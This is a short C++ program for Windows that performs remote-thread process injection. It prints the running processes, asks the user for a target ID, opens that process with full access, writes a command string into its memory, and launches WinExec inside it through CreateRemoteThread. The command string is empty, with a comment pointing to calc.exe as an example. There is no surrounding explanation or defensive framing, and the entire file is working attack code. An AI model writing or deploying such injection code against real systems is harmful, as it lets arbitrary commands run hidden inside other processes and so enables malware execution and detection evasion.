#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
using namespace std;



void InjProcess()
{
    HANDLE snap = (HANDLE)CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        cout << "nvm" << endl;
        return;
    }

    PROCESSENTRY32 processshot;

    processshot.dwSize = sizeof(PROCESSENTRY32);


    if (Process32First(snap, &processshot))
    {
        cout << "New Task Manger" << endl;

        do
        {

            cout << "Process ID : " << "[ " << processshot.th32ProcessID << "]" << endl;
            wcout << "Exe File : " << "[ " << processshot.szExeFile << "]" << endl;
            cout << "---------------------------------------" << endl;
        }

        while (Process32Next(snap, &processshot));
    }
    CloseHandle(snap);

    DWORD targetID;
    cout << "Enter Target ID : " << endl;
    cin >> targetID;

    HMODULE GetKernelLeb = GetModuleHandleA("kernel32.dll");

    LPVOID GetLebFromKernel = (LPVOID)GetProcAddress(GetKernelLeb, "WinExec");


    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetID);


    if (hProcess == NULL)
    {
        cout << "invalid address\n";
    }

    const char* write = ""; // example calc.exe

    SIZE_T commandLen = strlen(write) + 1;

    LPVOID sizeMemory = VirtualAllocEx(hProcess, NULL, commandLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    BOOL WriteMemory = WriteProcessMemory(hProcess, sizeMemory, write, commandLen, NULL);

    HANDLE Remote = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetLebFromKernel, sizeMemory, 0, NULL);


    if (Remote == NULL)
    {
        wcout << "Can't create remote" << GetLastError() << endl;

        return;
    }

    else
    {
        wcout << "GG" << endl;


        CloseHandle(Remote);
    }




}

int main()
{


    InjProcess();
    return 0;
}